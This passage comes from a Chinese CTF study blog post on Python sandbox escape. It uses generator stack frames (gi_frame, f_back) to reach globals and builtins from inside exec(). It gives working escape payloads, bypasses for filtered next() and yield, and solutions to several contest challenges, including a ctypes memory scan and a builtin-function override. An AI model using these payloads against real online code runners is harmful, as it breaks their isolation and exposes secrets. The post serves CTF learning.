class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)那么如何更改内置函数，就像L3HCTF那道题payload，可以自己定义一个来更改后赋值即可。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看了一下栈帧的属性，试一下<code>f_builtins</code>，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g=f()</span><br><span class="line">c=<span class="built_in">next</span>(g)</span><br><span class="line">d=c.f_builtins.<span class="built_in">str</span>  <span class="comment">#这里获取到了内置命名空间，在这里就可以获取到内置函数</span></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">Output：</span><br><span class="line">AttributeError: <span class="string">&#x27;dict&#x27;</span> <span class="built_in">object</span> has no attribute <span class="string">&#x27;str&#x27;</span></span><br></pre></td></tr></table></figure>

<p>有点奇怪，问了一下，原因大概如下：</p>
<ul>
<li><p><code>f_globals</code>是一个字典，包含了当前帧的全局变量。我们可以通过键来访问这个字典中的元素。在上一个代码中，<code>c.f_globals[&#39;__builtins__&#39;]</code>访问的是全局变量的一部分<code>__builtins__</code>，它指向内置命名空间，这个命名空间本身可以是一个模块或者一个字典，这取决于它是在交互式解释器中使用还是在一个脚本中。在大多数情况下，<code>__builtins__</code>是一个模块对象，你可以直接通过属性访问方式获取内置函数，如<code>.str</code>。</p>
</li>
<li><p><code>f_builtins</code>属性通常是一个对应内置命名空间的字典。这意味着，尽管它包含了所有的内置对象，但你不能使用属性访问方式来获取它们，因为字典不支持通过属性来访问键值，而是应该使用字典的键来访问。因此，你不能写<code>c.f_builtins.str</code>来获取<code>str</code>函数，而应该写<code>c.f_builtins[&#39;str&#39;]</code>。</p>
</li>
</ul>
<p>对于这里的理解可以尝试和ssti的继承链结合，这样就好理解了，所以我们这里需要改，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line">g=f()</span><br><span class="line">c=<span class="built_in">next</span>(g)</span><br><span class="line">d=c.f_builtins[<span class="string">&#x27;str&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;  </span><br></pre></td></tr></table></figure>

<p>成功获取到,由此可以进行后续操作</p>
<h3 id="利用栈帧沙箱逃逸"><a href="#利用栈帧沙箱逃逸" class="headerlink" title="利用栈帧沙箱逃逸"></a>利用栈帧沙箱逃逸</h3><p>原理就是通过生成器的栈帧对象再来使用f_back来返回前一帧从而逃逸出去获取globals全部变量（builtins同理）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def waff():</span></span><br><span class="line"><span class="string">    def f():</span></span><br><span class="line"><span class="string">        yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    g = f()  #生成器</span></span><br><span class="line"><span class="string">    frame = next(g) #获取到生成器的栈帧对象</span></span><br><span class="line"><span class="string">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #返回并获取前一级栈帧的globals</span></span><br><span class="line"><span class="string">    return b</span></span><br><span class="line"><span class="string">b=waff()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">locals</span>=&#123;&#125;</span><br><span class="line">code = <span class="built_in">compile</span>(codes, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line"><span class="built_in">exec</span>(code,<span class="built_in">locals</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">locals</span>[<span class="string">&quot;b&quot;</span>])</span><br></pre></td></tr></table></figure>

<p>此时可以得到全局变量<code>secret</code>的值，</p>
<p><strong>解读一下</strong></p>
<p>看了这个示例代码后，思考了一下流程，我改了一下，用如下测试代码看这是如何进行换帧的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g = f()  <span class="comment">#生成器</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(g)</span><br><span class="line">frame = <span class="built_in">next</span>(g) <span class="comment">#获取到生成器的栈帧对象</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;2:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line">f = frame.f_globals[<span class="string">&#x27;s3cret&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;3:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line">&lt;generator <span class="built_in">object</span> f at <span class="number">0x00000247258E87D0</span>&gt;</span><br><span class="line"><span class="number">2</span>:</span><br><span class="line">&lt;frame at <span class="number">0x0000024725B08AE0</span>, file <span class="string">&#x27;D:\\clx\\ceshi.py&#x27;</span>, line <span class="number">13</span>, code &lt;module&gt;&gt;</span><br><span class="line"><span class="number">3</span>:</span><br><span class="line">this <span class="keyword">is</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">然后再改一点点：</span><br><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g = f()  <span class="comment">#生成器</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(g)</span><br><span class="line">frame = <span class="built_in">next</span>(g) <span class="comment">#获取到生成器的栈帧对象</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;2:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line">f = frame.f_back  <span class="comment">#只有这里被改了</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;3:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line">Output：</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line">&lt;generator <span class="built_in">object</span> f at <span class="number">0x000001DD5A3689E0</span>&gt;</span><br><span class="line"><span class="number">2</span>:</span><br><span class="line">&lt;frame at <span class="number">0x000001DD5A4D8AE0</span>, file <span class="string">&#x27;D:\\clx\\venv\\haha.py&#x27;</span>, line <span class="number">12</span>, code &lt;module&gt;&gt;</span><br><span class="line"><span class="number">3</span>:</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>稍微说明一下（个人理解）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1对应 def f():</span><br><span class="line">    这一部分</span><br><span class="line">    </span><br><span class="line">2就已经通过f()函数里面的f_back进入到了全局变量这一帧</span><br><span class="line">3就可以获得全局变量了。</span><br></pre></td></tr></table></figure>

<p>这里注意：看两个代码的output在3的区别，结合第二串代码如果在改的那里改为<code>frame.f_back.f_back</code>会报错，</p>
<p><strong>可以得出一个结论</strong>：当使用最后一个<code>f_back</code>输出为None时，此时就这个帧已经对应到全局帧，可以直接利用。</p>
<p><strong>现在来解析一下之前给的示例</strong>，按照我原先的理解，我会认为<code>f_back</code>会多一个，一直想不清楚。向baicany大哥请教了一下，悟了：</p>
<p><strong>这个<code>exec</code>在执行时会创建一个环境，所以还需要在调用一个<code>f_back</code>逃逸从而去到全局那一帧。</strong></p>
<p>我们来改一下代码看结果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">codes=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def f():</span></span><br><span class="line"><span class="string">    yield g.gi_frame.f_back</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">g = f()  #生成器</span></span><br><span class="line"><span class="string">print(&#x27;1:&#x27;)</span></span><br><span class="line"><span class="string">print(g)</span></span><br><span class="line"><span class="string">frame = next(g) #获取到生成器的栈帧对象</span></span><br><span class="line"><span class="string">print(&#x27;2:&#x27;)</span></span><br><span class="line"><span class="string">print(frame)</span></span><br><span class="line"><span class="string">f = frame.f_back</span></span><br><span class="line"><span class="string">print(&#x27;3:&#x27;)</span></span><br><span class="line"><span class="string">print(f)</span></span><br><span class="line"><span class="string">d=f.f_globals[&#x27;s3cret&#x27;]</span></span><br><span class="line"><span class="string">print(&#x27;4:&#x27;)</span></span><br><span class="line"><span class="string">print(d)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">exec</span>(codes)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output：</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line">&lt;generator <span class="built_in">object</span> f at <span class="number">0x000001DE562387D0</span>&gt;</span><br><span class="line"><span class="number">2</span>:</span><br><span class="line">&lt;frame at <span class="number">0x000001DE56409760</span>, file <span class="string">&#x27;&lt;string&gt;&#x27;</span>, line <span class="number">10</span>, code &lt;module&gt;&gt;</span><br><span class="line"><span class="number">3</span>:</span><br><span class="line">&lt;frame at <span class="number">0x000001DE56409800</span>, file <span class="string">&#x27;D:\\clx\\venv\\haha.py&#x27;</span>, line <span class="number">21</span>, code &lt;module&gt;&gt;</span><br><span class="line"><span class="number">4</span>:</span><br><span class="line">this <span class="keyword">is</span> flag</span><br></pre></td></tr></table></figure>

<p>看结果，可以看出成功出来了，😭，本来想到是函数问题了，但在示例中最后那里调用了几个函数我就把这个问题排除了，<strong>exec()特殊</strong>！！！</p>
<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><h5 id="过滤函数next"><a href="#过滤函数next" class="headerlink" title="过滤函数next()"></a>过滤函数next()</h5><p>即命名空间这样设置：<code>&#123;&#39;__builtins__&#39;: None&#125;</code>，这就导致了内置函数<code>next()</code>不能使用</p>
<p><strong>（1）</strong>可以使用for循环,这里是采用的列表推导式，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">next(g) ==&gt; [x for x in g][0]</span><br></pre></td></tr></table></figure>

<p>但是注意，这里使用for循环来获取生成器对象会增加一个栈帧，所以需要再加一个<code>f_back</code>。</p>
<p><strong>（2）<code>send()</code>函数</strong></p>
<p>可以通过send()给生成器传递数据，调用<code>send()</code>后，就不用再调用了<code>next()</code>了，但是这个方法应该只有在只禁了<code>next()</code>函数下可以使用，而不是上面那种直接将内置函数都禁了。</p>
<p>直接给测试代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g = f()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(g)</span><br><span class="line">frame = g.send(<span class="literal">None</span>)</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">    <span class="number">1</span>:</span><br><span class="line">&lt;generator <span class="built_in">object</span> f at <span class="number">0x000001F30C930E40</span>&gt;</span><br><span class="line">&lt;frame at <span class="number">0x000001F30C527800</span>, file <span class="string">&#x27;D:\\clx\\venv\\haha.py&#x27;</span>, line <span class="number">8</span>, code &lt;module&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到已经逃逸到了全局空间。这里就是需要注意调用<code>send()</code>函数的格式和函数参数</p>
<h5 id="过滤yield-关键字"><a href="#过滤yield-关键字" class="headerlink" title="过滤yield 关键字"></a>过滤yield 关键字</h5><p>正好前面提到了变形的列表推导式也可以当做yield关键字来定义生成器，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=(a.gi_frame.f_back.f_back <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">这两个相当于</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">a</span>:</span><br><span class="line">    <span class="keyword">yield</span> </span><br><span class="line">g=a()</span><br></pre></td></tr></table></figure>

<p>给个代码来对比一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s3cret=<span class="string">&quot;this is flag&quot;</span></span><br><span class="line"></span><br><span class="line">a=(a.gi_frame.f_back <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">frame = <span class="built_in">next</span>(a) <span class="comment">#获取到生成器的栈帧对象</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;2:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(frame)</span><br><span class="line">d=frame.f_globals[<span class="string">&#x27;s3cret&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;3:&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="number">1</span>:</span><br><span class="line">&lt;generator <span class="built_in">object</span> &lt;genexpr&gt; at <span class="number">0x0000022469D6D630</span>&gt;</span><br><span class="line"><span class="number">2</span>:</span><br><span class="line">&lt;frame at <span class="number">0x0000022469CC8B40</span>, file <span class="string">&#x27;D:\\clx\\venv\\haha.py&#x27;</span>, line <span class="number">8</span>, code &lt;module&gt;&gt;</span><br><span class="line"><span class="number">3</span>:</span><br><span class="line">this <span class="keyword">is</span> flag</span><br></pre></td></tr></table></figure>

<p><code>[1]</code>可以换成<code>range(1)</code>，同样绕过方法可以组合起来用，注意<code>f_back</code>个数即可。</p>
<h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><h5 id="L3HCTF-2024-intractable-problem-revenge"><a href="#L3HCTF-2024-intractable-problem-revenge" class="headerlink" title="L3HCTF 2024 -intractable problem revenge"></a>L3HCTF 2024 -intractable problem revenge</h5><p>暂时没找到复现环境，payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">factorization</span>(<span class="params">n</span>):</span><br><span class="line">    a=(a.gi_frame.f_back.f_back <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">1</span>])</span><br><span class="line">    a=[x <span class="keyword">for</span> x <span class="keyword">in</span> a][<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">globals</span>=a.f_back.f_back.f_globals</span><br><span class="line">    builtin = <span class="built_in">globals</span>[<span class="string">&quot;_&quot;</span> + <span class="string">&quot;_builtins_&quot;</span> + <span class="string">&quot;_&quot;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fakeint</span>(<span class="params">i</span>):</span><br><span class="line">        <span class="keyword">if</span>(builtin.<span class="built_in">len</span>(i)&gt;<span class="number">100</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">123123</span>*<span class="number">123123</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">123123</span></span><br><span class="line"></span><br><span class="line">    builtin.<span class="built_in">int</span>=fakeint</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span></span><br></pre></td></tr></table></figure>

<p>简单看了一下，逃逸过后进入到全局变量来改函数</p>
<p>L3HCTF官方wp：<code>https://hust-l3hsec.feishu.cn/docx/MZ8SdwSoPo3cBTxOxbGcuUBun4c</code></p>
<h5 id="第九届中国海洋大学-菜狗工具-2"><a href="#第九届中国海洋大学-菜狗工具-2" class="headerlink" title="第九届中国海洋大学-菜狗工具#2"></a>第九届中国海洋大学-菜狗工具#2</h5><p>题目描述：小王经过上次的惨痛教训后深刻反思，得出了解决不了 flag 泄露就解决 flag 本身的办法 这次你能拿到 flag 吗？</p>
<p>——————————————</p>
<p>附件内容：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">black_list = [</span><br><span class="line">    <span class="string">&#x27;__build_class__&#x27;</span>, <span class="string">&#x27;__debug__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;SystemExit&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;breakpoint&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>, <span class="string">&#x27;memoryview&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;quit&#x27;</span>, <span class="string">&#x27;input&#x27;</span></span><br><span class="line">]</span><br><span class="line">new_builtins = <span class="built_in">dict</span>([</span><br><span class="line">    (key, val) <span class="keyword">for</span> key, val <span class="keyword">in</span> __builtins__.__dict__.items() <span class="keyword">if</span> key <span class="keyword">not</span> <span class="keyword">in</span> black_list</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;xxxxxxxxx&#125;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;DISPOSED&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/static/index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    out = io.StringIO()</span><br><span class="line">    script = <span class="built_in">str</span>(request.form[<span class="string">&quot;script&quot;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">wrap_print</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">        kwargs[<span class="string">&quot;file&quot;</span>] = out</span><br><span class="line">        <span class="built_in">print</span>(*args, **kwargs)</span><br><span class="line">    new_builtins[<span class="string">&quot;print&quot;</span>] = wrap_print</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span>(script, &#123;<span class="string">&quot;__builtins__&quot;</span>: new_builtins&#125;)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        wrap_print(e)</span><br><span class="line">    </span><br><span class="line">    ret = out.getvalue()</span><br><span class="line">    out.close()</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">5</span>) <span class="comment"># current source file is deleted</span></span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">9001</span>)</span><br></pre></td></tr></table></figure>

<p>这道题的提交按钮被disables了，删了就能提交了</p>
<p>直接用栈帧逃逸打吧，这道题对于栈帧逃逸的关键字没得过滤，可以直接用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    <span class="keyword">yield</span> a.gi_frame.f_back</span><br><span class="line">	</span><br><span class="line">a=haha()</span><br><span class="line">c=<span class="built_in">next</span>(a)</span><br><span class="line">d=c.f_back.f_globals[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(d)</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/06/python%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8/image-20240605224858187.png" alt="image-20240605224858187"></p>
<h6 id="ctypes模块"><a href="#ctypes模块" class="headerlink" title="ctypes模块"></a>ctypes模块</h6><p>但是这里的flag被删除了，不会了，看下<strong>晨曦师傅的做法</strong></p>
<p>思路：题目环境在 chroot jail 中，没有 &#x2F;proc 目录，不能通过读文件的方式读内存，但是</p>
<p><strong>可以利用<code>ctypes</code>模块的指针</strong>，将flag地址周围的值读一下，实现一个从内存读源码的操作。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back.f_back</span><br><span class="line"></span><br><span class="line">g = f()</span><br><span class="line">frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> g][<span class="number">0</span>]</span><br><span class="line">b = frame.f_back.f_globals</span><br><span class="line">flag_id=<span class="built_in">id</span>(b[<span class="string">&#x27;flag&#x27;</span>])</span><br><span class="line">ctypes = b[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>)</span><br><span class="line"><span class="comment">#print(ctypes)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">	txt = ctypes.cast((flag_id-<span class="number">8</span>*i),ctypes.c_char_p).value</span><br><span class="line">	<span class="keyword">if</span> <span class="string">b&quot;flag&#123;&quot;</span> <span class="keyword">in</span> txt:</span><br><span class="line">		<span class="built_in">print</span>(txt)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>学习一下wp：</p>
<p>主要关注两个部分，如下：</p>
<ul>
<li><code>id()</code>函数：返回对象的内存地址，<a href="https://blog.csdn.net/zhuzuwei/article/details/80554776">参考文章</a></li>
<li><code>ctypes.cast((flag_id-8*i),ctypes.c_char_p).value</code></li>
</ul>
<p>将第二个拆分解答</p>
<ul>
<li><p><code>ctypes.cast(address, type)</code> 函数将一个地址转换为指定类型的指针。在这里是将一个地址转换为指定类型的指针。</p>
</li>
<li><p><code>ctypes.c_char_p</code>是ctypes类的数据，表示 C 风格的 <code>char *</code> 指针，用于指向字符串。</p>
</li>
<li><p><code>flag_id-8*</code>，那随便输入两个变量套一个id()就可以看看两个变量的地址差值，尝试了一下，完全符合，晨曦师傅tql</p>
</li>
</ul>
<p>结合起来，<code>ctypes.cast((flag_id-8*i),ctypes.c_char_p).value</code>，可以参考<a href="https://blog.csdn.net/jhsxy2005/article/details/114371993">文章</a></p>
<p>这就是读取对应内存地址的值的构造方法，<strong>那么为什么是<code>flag_id-8*i</code>，个人想法</strong>（应该没有错吧）：</p>
<p>当前<code>flag_id</code>对应<code>DISPOSED</code>，同时已知这个真实flag是先被赋值了的，说明真实flag的内存是在前面，所以这里是<code>-</code>，向前推进。</p>
<p>然后最后匹配到就输出flag。精妙精妙，学到了学到了。</p>
<h6 id="gc模块"><a href="#gc模块" class="headerlink" title="gc模块"></a><code>gc</code>模块</h6><p>由于过滤了<code>__import__</code>，这里要自己找一个能加载模块的类</p>
<p>最后选择了<code>_frozen_importlib.BuiltinImporter</code>这个可以导入内置模块的查找器,<a href="https://blog.csdn.net/jeffery0207/article/details/120612313">参考文章</a></p>
<p><code>gc.get_objects()</code>：这个函数会返回当前被管理的所有对象的列表。</p>
<p>payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print([].__class__.__base__.__subclasses__()[84].load_module(&#x27;gc&#x27;).get_objects())</span><br></pre></td></tr></table></figure>



<p>让gpt改了一下，本地利用的方式为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> _frozen_importlib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入的模块名称</span></span><br><span class="line">module_name = <span class="string">&#x27;gc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用BuiltinImporter导入模块</span></span><br><span class="line">loaded_module = _frozen_importlib.BuiltinImporter.load_module(module_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印模块内容</span></span><br><span class="line"><span class="built_in">print</span>(loaded_module)</span><br><span class="line"><span class="built_in">print</span>(loaded_module.get_objects())</span><br></pre></td></tr></table></figure>



<h6 id="官方的做法"><a href="#官方的做法" class="headerlink" title="官方的做法"></a>官方的做法</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sys = <span class="built_in">print</span>.__globals__[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>)</span><br><span class="line">io = <span class="built_in">print</span>.__globals__[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;io&#x27;</span>)</span><br><span class="line">dis = <span class="built_in">print</span>.__globals__[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;dis&#x27;</span>)</span><br><span class="line">threading = <span class="built_in">print</span>.__globals__[<span class="string">&quot;__builtins__&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;threading&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(threading.<span class="built_in">enumerate</span>())     <span class="comment">#获取所有活跃线程</span></span><br><span class="line"><span class="built_in">print</span>(threading.main_thread())    <span class="comment">#获取主线程</span></span><br><span class="line"><span class="built_in">print</span>(threading.main_thread().ident)   <span class="comment"># 获取主线程标识符</span></span><br><span class="line"><span class="built_in">print</span>(sys._current_frames())      <span class="comment"># 获取所有线程的堆栈帧对象</span></span><br><span class="line"><span class="built_in">print</span>(sys._current_frames()[threading.main_thread().ident]) <span class="comment">#获取到主线程的堆栈帧对象</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">frame = sys._current_frames()[threading.main_thread().ident]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> frame <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">	out = io.StringIO()     <span class="comment"># 内存创建字符串I/O流</span></span><br><span class="line">	dis.dis(frame.f_code,file=out)   <span class="comment"># 将当前堆栈帧所对应的函数的字节码进行反汇编</span></span><br><span class="line">	content = out.getvalue()    <span class="comment">#获取反汇编的结果</span></span><br><span class="line">	out.close()</span><br><span class="line">	<span class="built_in">print</span>(content)</span><br><span class="line">	frame = frame.f_back</span><br></pre></td></tr></table></figure>

<p>这里因为源码里对flag重复赋值了一次导致直接查app.py的<code>f_globals</code>得不到flag</p>
<p>需要对其栈帧进行反汇编拿到初次赋值的flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">out = io.StringIO()     # 内存创建字符串I/O流</span><br><span class="line">dis.dis(frame.f_code,file=out)   # 将当前堆栈帧所对应的函数的字节码进行反汇编</span><br><span class="line">content = out.getvalue()    #获取反汇编的结果</span><br><span class="line">out.close()</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure>

<p>分析可看参考文章</p>
<p>文章：<code>https://chenxi9981.github.io/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/</code></p>
<p><code>https://c1oudfl0w0.github.io/blog/2024/04/24/%E7%AC%AC%E4%B9%9D%E5%B1%8A%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/#gc%E8%A7%A3%E6%B3%95</code></p>
<h5 id="CISCN-2024-–mossfern"><a href="#CISCN-2024-–mossfern" class="headerlink" title="CISCN 2024 –mossfern"></a>CISCN 2024 –mossfern</h5><p>题目描述：<br>小明最近搭建了一个学习 Python 的网站，他上线了一个 Demo。据说提供了很火很安全的在线执行功能，你能帮他测测看吗？</p>
<p>——————————————————</p>
<p>在ctfshow上可以复现，但是没有前端，不想去复现，给了附件：</p>
<p>main.py</p>
